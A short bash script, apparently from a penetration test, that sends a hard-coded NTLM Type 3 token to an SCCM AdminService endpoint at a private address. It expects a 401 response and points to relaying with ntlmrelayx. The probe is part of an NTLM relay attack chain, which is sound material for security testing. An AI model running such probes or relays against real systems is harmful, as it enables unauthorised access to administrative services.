#!/bin/bash

# Simple one-liner to test if Type 3 token structure is accepted
# NOTE: Will likely fail with 401 because challenge-response mismatch

TYPE3="TlRMTVNTUAADAAAAAQABAHAAAAAAAAAAcQAAAAAAAABYAAAAAAAAAFgAAAAYABgAWAAAAAAAAABxAAAABYqIogoAfE8AAAAPwN8qQsx3ypjDezlisG/sUVMAQwBDAE0ALQBTAEkAVABFAFMAUgBWAAA="

echo "Testing Type 3 token against AdminService..."
echo ""

curl -v -k \
  -H "Authorization: Negotiate ${TYPE3}" \
  "https://10.14.10.15/AdminService/wmi/SMS_Admin" \
  2>&1 | grep -A5 "< HTTP"

echo ""
echo "---"
echo ""
echo "EXPECTED: 401 Unauthorized (challenge-response mismatch)"
echo "The token is valid structure but wrong challenge response"
echo ""
echo "To actually relay: Use ntlmrelayx with --try-local flag"
